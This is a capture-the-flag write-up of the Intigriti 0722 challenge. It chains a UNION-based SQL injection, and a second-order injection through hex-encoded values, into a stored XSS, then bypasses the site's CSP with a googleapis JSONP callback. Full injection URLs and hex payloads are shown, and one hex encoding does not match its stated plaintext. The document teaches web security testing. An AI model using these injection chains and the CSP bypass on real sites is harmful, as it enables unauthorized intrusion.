---
layout: post
title: Intigriti XSS Challenge 0722 Writeup
date: 2022-08-21
categories: [CTF, writeup]
tags: [CTF.XSS] 
---


### Introduction:
The Intigriti 0722 XSS Challenge involves exploiting an SQL injection vulnerability to execute an XSS payload while bypassing Content Security Policy (CSP) restrictions.


**Challenge URL:** [https://challenge-0722.intigriti.io/](https://challenge-0722.intigriti.io/)

**Objective:** Trigger an alert box within the domain.


&nbsp;

### Initial Discovery
The application is a basic single-page blog with less functionality. The site mainly consists of static blog entries, with most links inactive except for the "Archives" links that filter posts by month.

![image.png](/assets/img/Blog_images/intigriti-0722-xss-challenge/image.png)

`?month` is the parameter used by the archives links and inserting a single quote (`'`) into this parameter caused an application error

Inserting the SQL injection payload `0 or 1=1` into the URL caused the posts to reappear:

`https://challenge-0722.intigriti.io/challenge/challenge.php?month=0 or 1=1`

Changing the payload to `0 or 1=2` caused the posts to disappear. This indicates that the month parameter is vulnerable to SQL injection.

&nbsp;

### SQL Injection

To identify the number of columns in the table, I used a UNION-based payload and incremented the number of fields until an error appeared on the page:

`https://challenge-0722.intigriti.io/challenge/challenge.php?month=2 union select 1,2,3,4,5--`

The site did not produce an error with up to 5 fields, but adding a sixth field resulted in an error, indicating that there are 5 columns in the table.

When I inserted anything other than numbers, the site returned an error. This indicates that the 5 columns only accept numeric values, so we need to hex encode our payload for each column.

I encoded the XSS payload `<script>alert(1)</script>` into its hexadecimal representation: `0x3c7363726970743e616c6572742831293c2f7363726970743e`. I then inserted this encoded payload into each column to test if it would trigger an XSS attack. To differentiate the columns, I included distinct numbers inside each `alert()`.

`https://challenge-0722.intigriti.io/challenge/challenge.php?month=2 union select 0x3c7363726970743e616c6572742831293c2f7363726970743e,0x3c7363726970743e616c6572742832293c2f7363726970743e,0x3c7363726970743e616c6572742833293c2f7363726970743e,0x3c7363726970743e616c6572742834293c2f7363726970743e,0x3c7363726970743e616c6572742835293c2f7363726970743e--` 

![image.png](/assets/img/Blog_images/intigriti-0722-xss-challenge/image%201.png)

The payloads are being reflected, but they are HTML encoded. Additionally, the author name field appears empty.

```html
	  <article class="blog-post">
		<h2 class="blog-post-title">&lt;script&gt;alert(2)&lt;/script&gt;</h2>
		<p class="blog-post-meta">&lt;script&gt;alert(5)&lt;/script&gt; by <a href="#"></a></p>

		<p>&lt;script&gt;alert(3)&lt;/script&gt;</p>
	  </article>
```

 Injecting values `1` or `2` into the fourth field of our UNION SELECT query displays the author names "Anton" and "Jake," respectively. Any other numeric values result in an empty author name field.

![image.png](/assets/img/Blog_images/intigriti-0722-xss-challenge/image%202.png)

There might be a chance that the value from the fourth field is used in another SQL query and could be vulnerable to SQL injection. By injecting the hex-encoded payload `0x30206f7220313d30` (representing `0 or 1=0`) into the fourth field, the author name field returns empty. Conversely, injecting `0x30206f7220313d31` (representing `0 or 1=1`) displays the author name, confirming that it is vulnerable to SQL injection.

To identify the number of columns in the table, I used a UNION-based payload and incremented the number of fields until post’s author name is returned in the site.

Since only numerical values were accepted, I hex-encoded the payload `0 UNION SELECT 1,2,3` to `0x3020554e494f4e2053454c45435420312c322c33`

Inserting this hex-encoded payload into the fourth field of the initial SQLi UNION query:

`https://challenge-0722.intigriti.io/challenge/challenge.php?month=2 union select 1,2,3,0x3020554e494f4e2053454c45435420312c322c33,5--`

showed the author’s name. Adding an additional field to the second payload removed the author field, confirming that there are three columns in the second table. The value `2` is also reflected in the author name, coming from the second field of the Second SQLi payload

![image.png](/assets/img/Blog_images/intigriti-0722-xss-challenge/image%203.png)

I encoded the XSS payload `<script>alert(1)</script>` to hex format as `0x3c7363726970743e616c6572742831293c2f7363726970743e` and inserted it into the second field of the SQLi payload:

`0 UNION SELECT 1,0x3c7363726970743e616c6572742831293c2f7363726970743e,3`

Next, I hex-encoded the entire payload to `0x3020554e494f4e2053454c45435420312c307833633733363337323639373037343365363136633635373237343238333132393363326637333633373236393730373433652c33`, which was then placed into the fourth field of the initial SQLi payload:

`https://challenge-0722.intigriti.io/challenge/challenge.php?month=2 union select 1,2,3,0x3020554e494f4e2053454c45435420312c307833633733363337323639373037343365363136633635373237343238333132393363326637333633373236393730373433652c33,5--`

The result of this payload:

![image.png](/assets/img/Blog_images/intigriti-0722-xss-challenge/image%204.png)

Although the payload renders without any encoding, it is not being triggered. Checking the console confirms that the payload is being blocked by the Content Security Policy.

![image.png](/assets/img/Blog_images/intigriti-0722-xss-challenge/image%205.png)

&nbsp;

### Bypassing CSP

Checking the HTTP response header reveals the site's Content Security Policy (CSP):

`Content-Security-Policy: default-src 'self' *.googleapis.com *.gstatic.com *.cloudflare.com`

This configuration restricts script execution to the origin or the three specified domains. 

To evaluate whether the CSP is correctly implemented, I used [Google's CSP Evaluator](https://csp-evaluator.withgoogle.com/). 

![image.png](/assets/img/Blog_images/intigriti-0722-xss-challenge/image%206.png)

The results indicated that the provided allowlists can be bypassed.

I then applied a CSP bypass method from [Brutelogic's CSP Bypass Guidelines](https://brutelogic.com.br/blog/csp-bypass-guidelines/), which utilizes the googleapis.com API.

I encoded the XSS payload

**`<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>`**

to its hex representation: `0x3c736372697074207365723d68747470733a2f2f7777772e676f6f676c65617069732e636f6d2f637573746f6d7365617263682f76313f63616c6c6261636b3d616c6572742831293e3c2f7363726970743e`.

I then inserted this into the second field of the second SQLi payload:

`0 UNION SELECT 1,0x3c736372697074207365723d68747470733a2f2f7777772e676f6f676c65617069732e636f6d2f637573746f6d7365617263682f76313f63616c6c6261636b3d616c6572742831293e3c2f7363726970743e,3`

Next, I hex-encoded the entire payload:

`0x3020554e494f4e2053454c45435420312c30783363353336333732363937303734323035333732363333643638373437343730373333613266326637373737373732653637366636663637366336353631373036393733326536333666366432663633373537333734366636643733363536313732363336383266373633313366363336313663366336323631363336623364363136633635373237343238363436663633373536643635366537343265363436663664363136393665323933653363326635333633373236393730373433652c33`.

This was placed in the fourth field of the initial SQLi payload, resulting in the final payload that triggers the alert:

`https://challenge-0722.intigriti.io/challenge/challenge.php?month=2 union select 1,2,3,0x3020554e494f4e2053454c45435420312c30783363353336333732363937303734323035333732363333643638373437343730373333613266326637373737373732653637366636663637366336353631373036393733326536333666366432663633373537333734366636643733363536313732363336383266373633313366363336313663366336323631363336623364363136633635373237343238363436663633373536643635366537343265363436663664363136393665323933653363326635333633373236393730373433652c33,5--`

![image.png](/assets/img/Blog_images/intigriti-0722-xss-challenge/image%207.png)
